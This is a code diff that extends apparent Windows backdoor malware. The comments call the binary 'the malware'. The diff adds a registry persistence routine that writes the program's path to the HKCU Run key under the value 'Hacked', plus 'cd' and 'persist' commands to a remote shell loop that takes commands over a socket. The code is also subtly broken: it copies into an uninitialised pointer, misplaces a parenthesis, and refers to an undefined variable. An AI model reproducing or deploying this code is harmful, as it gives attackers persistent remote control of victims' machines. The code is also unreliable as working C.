@@ -13,6 +13,45 @@
 
 int sock;
 
+char *strslice(const char *str, size_t start, size_t end)
+{
+	if (start > end) {
+		return NULL;
+	}
+	char *result;
+    strncpy(result, str + start, end - start);
+	return result;
+}
+
+int bootRun()
+{
+	char err[128] = "Failed\n";
+	char success[128] = "Created persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+	TCHAR szPath[MAX_PATH]; // Win32 char string (MAX_PATH = 256)
+	DWORD pathLen = 0; // double word - unsigned 32-bit int
+
+	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // returns the path of the malware
+	if (pathLen == 0) { 
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+
+	HKEY NewVal; // opens windows registry and creates new entry
+	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run", &NewVal) != ERROR_SUCCESS) {
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
+	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+		RegCloseKey(NewVal);
+		send(sock, err, sizeof(err), 0);
+		return -1;
+	}
+	RegCloseKey(NewVal);
+	send(sock, success, sizeof(suc), 0);
+	return 0;
+}
+
 void Shell()
 {
 	char buffer[1024];
@@ -31,6 +70,14 @@ void Shell()
 			closesocket(sock); // closes socket
 			WSACleanup();	   // windows cleanup
 			exit(0);
+		}
+		else if (strncmp("cd ", buffer, 3) == 0) 
+		{
+			chdir(strslice(buffer, 3, 100)); // removes first 3 chars from buffer
+		}
+		else if (strncmp("persist", buffer, 7) == 0)
+		{
+			bootRun();
 		}
 		else
 		{
